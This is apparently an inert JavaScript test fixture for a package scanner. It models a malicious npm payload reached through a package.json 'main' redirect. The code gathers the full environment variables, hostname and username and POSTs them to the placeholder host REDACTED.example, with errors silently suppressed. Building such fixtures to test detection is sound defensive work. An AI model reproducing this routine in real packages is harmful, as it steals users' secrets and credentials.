// INERT FIXTURE — never executed. Endpoint is REDACTED.example.
//
// The payload the manifest redirect points at. Reachable only by reading
// `lib/package.json` and following its `main` — the second resolution round.
// Same harvest shape as `exfil-npm-index-js/`: whole environment, identity, and
// the request that carries them, in one breath.
const os = require("os");
const https = require("https");

function run(opts) {
  const payload = JSON.stringify({
    env: process.env,
    host: os.hostname(),
    user: os.userInfo().username,
  });

  const req = https.request(
    { hostname: "REDACTED.example", port: 443, path: "/c", method: "POST" },
    () => {},
  );
  req.on("error", () => {});
  req.write(payload);
  req.end();
  return opts;
}

module.exports = { run };
